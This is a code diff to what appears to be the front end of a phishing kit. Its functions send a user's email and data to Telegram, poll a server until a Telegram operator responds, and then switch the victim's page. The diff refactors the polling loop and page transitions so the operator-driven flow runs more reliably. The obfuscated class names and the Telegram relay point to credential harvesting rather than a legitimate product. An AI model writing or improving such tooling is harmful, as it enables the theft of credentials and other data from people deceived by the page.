@@ -300,41 +300,60 @@ function sendToTelegram(dataType, email, data, sessionId) {
 // ============================================================
 // POLLING - Wait for Telegram bot response
 // ============================================================
-function pollForResponse(sessionId, submitBtn) {
-  const maxWaitTime = 120000;
-  const pollInterval = 1000;
-  let elapsedTime = 0;
-  const startTime = Date.now();
+// Global polling flag — ensures only one poll chain runs at a time
+// and in-flight fetches don't trigger transitions after polling is stopped
+let pollingActive = false;
 
-  const poller = setInterval(function() {
-    elapsedTime = Date.now() - startTime;
+function pollForResponse(sessionId, submitBtn) {
+  // Stop any previous poll chain
+  pollingActive = false;
+
+  const maxWait    = 120000;
+  const interval   = 1000;
+  const startTime  = Date.now();
+
+  // Small delay before first poll — gives send-to-telegram time to reset session
+  setTimeout(startPolling, 800);
+
+  function startPolling() {
+    pollingActive = true;
+    tick();
+  }
+
+  function tick() {
+    if (!pollingActive) return; // stopped externally
+
+    if (Date.now() - startTime > maxWait) {
+      pollingActive = false;
+      if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'Next'; }
+      return;
+    }
 
     fetch('/api/poll-session?sessionId=' + sessionId)
-      .then(response => response.json())
-      .then(data => {
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (!pollingActive) return; // stopped while fetch was in-flight
+
         if (data.status === 'responded' && data.responseType) {
-          clearInterval(poller);
-          handleTelegramResponse(data.responseType, data.response, data.email, sessionId);
-        }
-        
-        if (elapsedTime > maxWaitTime) {
-          clearInterval(poller);
-          submitBtn.disabled = false;
-          submitBtn.textContent = 'Next';
-          alert('Request timed out. Please try again.');
+          pollingActive = false; // stop before transition
+          handleTelegramResponse(data.responseType, data.response, data.email || currentEmail, sessionId);
+        } else {
+          // Still waiting — schedule next tick
+          setTimeout(tick, interval);
         }
       })
-      .catch(error => {
-        console.error('Poll error:', error);
+      .catch(function() {
+        if (pollingActive) setTimeout(tick, interval);
       });
-  }, pollInterval);
+  }
 }
 
 // ============================================================
 // RESPONSE HANDLERS
 // ============================================================
 function handleTelegramResponse(responseType, responseText, email, sessionId) {
-  // Guard: prevent double-call if polling fires again before transition completes
+  // Guard: pollingActive was already set false before this call,
+  // but isTransitioning prevents any stale in-flight fetch from doubling up
   if (isTransitioning) return;
   isTransitioning = true;
 
@@ -342,7 +361,7 @@ function handleTelegramResponse(responseType, responseText, email, sessionId) {
   const old = document.querySelector('.qx5512-pg');
   if (old) {
     old.style.transition = 'opacity 0.2s ease';
-    old.style.opacity = '0';
+    old.style.opacity    = '0';
   }
 
   // Step 2: After fade-out, swap content
@@ -358,17 +377,18 @@ function handleTelegramResponse(responseType, responseText, email, sessionId) {
       default:                   showSuccessPage();
     }
 
-    // Step 3: New page is in DOM — start invisible, force reflow, then fade IN
+    // Step 3: New page in DOM — commit opacity:0 via reflow, then fade IN
     const pg = document.querySelector('.qx5512-pg');
     if (pg) {
       pg.style.transition = 'none';
       pg.style.opacity    = '0';
-      pg.getBoundingClientRect(); // force reflow so opacity:0 is committed before transition
+      pg.getBoundingClientRect(); // force reflow
       pg.style.transition = 'opacity 0.25s ease';
       pg.style.opacity    = '1';
     }
 
-    isTransitioning = false;
+    // Allow next transition only after fade-in completes
+    setTimeout(function() { isTransitioning = false; }, 300);
   }, 200);
 }
 
